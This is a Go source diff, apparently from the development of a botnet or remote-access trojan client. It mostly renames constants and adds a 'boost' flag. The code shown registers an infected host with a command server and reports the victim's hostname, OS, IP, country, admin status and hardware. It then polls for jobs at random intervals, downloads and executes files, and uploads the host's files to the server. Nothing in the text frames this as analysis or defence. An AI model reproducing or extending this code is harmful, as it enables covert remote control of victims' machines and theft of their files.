@@ -12,23 +12,14 @@ import (
 	"time"
 )
 
-const (
-	serverAddr = "http://127.0.0.1:5000"
-
-	maxRetries = 10
-
-	minDelay = 5
-	maxDelay = 60
-)
-
 type RequestType int
 
 const (
-	REGISTER RequestType = iota
-	HARDWARE
-	RETRIEVE
-	REPORTS
-	UPLOADS
+	REGISTER_R RequestType = iota
+	HARDWARE_R
+	RETRIEVE_R
+	REPORTS_R
+	UPLOADS_R
 )
 
 type Worker struct {
@@ -43,6 +34,7 @@ type HostInfo struct {
 	Os       string `json:"os"`
 	IpAddr   string `json:"ip_addr"`
 	Country  string `json:"country"`
+	Boost    bool   `json:"boost"`
 	IsAdmin  bool   `json:"is_admin"`
 }
 
@@ -54,18 +46,18 @@ type HardwareInfo struct {
 
 // TODO: check for wrong input?
 func buildRequestUrl(reqType RequestType, workerId, jobId string) string {
-	baseUrl := serverAddr + "/api/workers/" + workerId
+	baseUrl := SERVER_ADDR + "/api/workers/" + workerId
 	switch reqType {
-	case RETRIEVE:
-		return baseUrl + "/jobs/undone"
-	case REPORTS:
+	case RETRIEVE_R:
+		return baseUrl + "/jobs?undone"
+	case REPORTS_R:
 		return baseUrl + "/jobs/" + jobId + "/report"
-	case UPLOADS:
+	case UPLOADS_R:
 		return baseUrl + "/uploads"
-	case HARDWARE:
+	case HARDWARE_R:
 		return baseUrl + "/hardware"
-	case REGISTER:
-		return serverAddr + "/api/workers"
+	case REGISTER_R:
+		return SERVER_ADDR + "/api/workers"
 	}
 	return ""
 }
@@ -82,15 +74,15 @@ func NewWorker() *Worker {
 
 // TODO: call this method only if worker not persisted!
 func (w *Worker) register() bool {
-	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin}
+	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin, Boost: false}
 	hostInfo.Hostname, _ = os.Hostname()
 	hostInfo.Os, _ = win.GetOsName()
 	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()
 
 	reqBody, _ := json.Marshal(hostInfo)
-	registerUrl := buildRequestUrl(REGISTER, w.id, "")
+	registerUrl := buildRequestUrl(REGISTER_R, w.id, "")
 
-	for i := 1; i <= maxRetries; i++ {
+	for i := 1; i <= MAX_RETRIES; i++ {
 		resp, err := http.Post(registerUrl, "application/json", bytes.NewBuffer(reqBody))
 		if err == nil {
 			resp.Body.Close()
@@ -110,7 +102,7 @@ func (w *Worker) tellHardwareInfo() {
 	hardwareInfo.Ram = utils.ToReadableSize(totalRam)
 
 	reqBody, _ := json.Marshal(hardwareInfo)
-	hardwareInfoUrl := buildRequestUrl(HARDWARE, w.id, "")
+	hardwareInfoUrl := buildRequestUrl(HARDWARE_R, w.id, "")
 
 	resp, err := http.Post(hardwareInfoUrl, "application/json", bytes.NewBuffer(reqBody))
 	if err == nil {
@@ -119,13 +111,13 @@ func (w *Worker) tellHardwareInfo() {
 }
 
 func (w *Worker) poll() {
-	jobsUrl := buildRequestUrl(RETRIEVE, w.id, "")
+	jobsUrl := buildRequestUrl(RETRIEVE_R, w.id, "")
 	errorN := 0
 	for {
 		resp, err := http.Get(jobsUrl)
 		if err != nil {
 			errorN++
-			if errorN == maxRetries {
+			if errorN == MAX_RETRIES {
 				w.kill()
 				return
 			}
@@ -148,9 +140,9 @@ func (w *Worker) poll() {
 		}
 	end:
 		if w.boostMode {
-			time.Sleep(time.Duration(minDelay) * time.Second)
+			time.Sleep(time.Duration(MIN_DELAY) * time.Second)
 		} else {
-			time.Sleep(time.Duration(utils.RandomInt(minDelay, maxDelay)) * time.Second)
+			time.Sleep(time.Duration(utils.RandomInt(MIN_DELAY, MAX_DELAY)) * time.Second)
 		}
 	}
 }
@@ -181,7 +173,7 @@ func (w *Worker) resolve(job Job) {
 			w.report(job.Id, "File downloaded and executed.")
 		}
 	case UPLOAD:
-		destUrl := buildRequestUrl(UPLOADS, w.id, "")
+		destUrl := buildRequestUrl(UPLOADS_R, w.id, "")
 		if err := utils.UploadFile(args[0], destUrl); err != nil {
 			w.report(job.Id, err.Error())
 		} else {
@@ -199,7 +191,7 @@ func (w *Worker) resolve(job Job) {
 }
 
 func (w *Worker) report(jobId int, rep string) { // TODO: accept only bytes?
-	reportUrl := buildRequestUrl(REPORTS, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
+	reportUrl := buildRequestUrl(REPORTS_R, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
 	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", bytes.NewBuffer([]byte(rep)))
 	if err == nil {
 		resp.Body.Close()
